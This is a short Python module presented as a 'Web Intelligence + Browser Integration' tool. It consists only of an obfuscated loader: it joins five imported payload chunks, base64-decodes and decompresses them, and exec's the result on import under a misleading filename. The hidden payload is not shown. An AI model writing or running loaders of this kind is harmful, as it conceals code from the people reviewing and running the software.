"""AI AYFAM - Web Intelligence + Browser Integration."""
import zlib, base64
from tools._web_payload_p0 import P0
from tools._web_payload_p1 import P1
from tools._web_payload_p2 import P2
from tools._web_payload_p3 import P3
from tools._web_payload_p4 import P4
_src = zlib.decompress(base64.b64decode(P0 + P1 + P2 + P3 + P4))
exec(compile(_src, "tools/web.py", "exec"), globals())
